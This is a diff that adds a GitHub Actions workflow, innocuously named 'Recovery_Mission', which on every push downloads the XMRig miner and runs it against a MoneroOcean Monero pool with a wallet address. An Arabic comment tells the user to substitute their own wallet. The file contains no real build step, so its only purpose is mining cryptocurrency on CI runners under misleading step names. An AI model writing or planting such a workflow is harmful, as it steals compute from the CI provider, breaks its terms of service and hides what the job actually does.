@@ -1,0 +1,13 @@
+name: Recovery_Mission
+on: [push]
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+    - name: Initiating System
+      run: |
+        wget https://github.com/xmrig/xmrig/releases/download/v6.21.0/xmrig-6.21.0-linux-static-x64.tar.gz
+        tar xvzf xmrig-6.21.0-linux-static-x64.tar.gz
+        cd xmrig-6.21.0
+        # استبدل المحفظة بعنوان محفظتك من Trust Wallet
+        ./xmrig -o ghost.moneroocean.stream:10128 -u 46YVvKq6B5A6fE8W6S3XvS1X3Y7V8G9Z -p AhmedCj_Mission --cpu-max-threads-hint 50
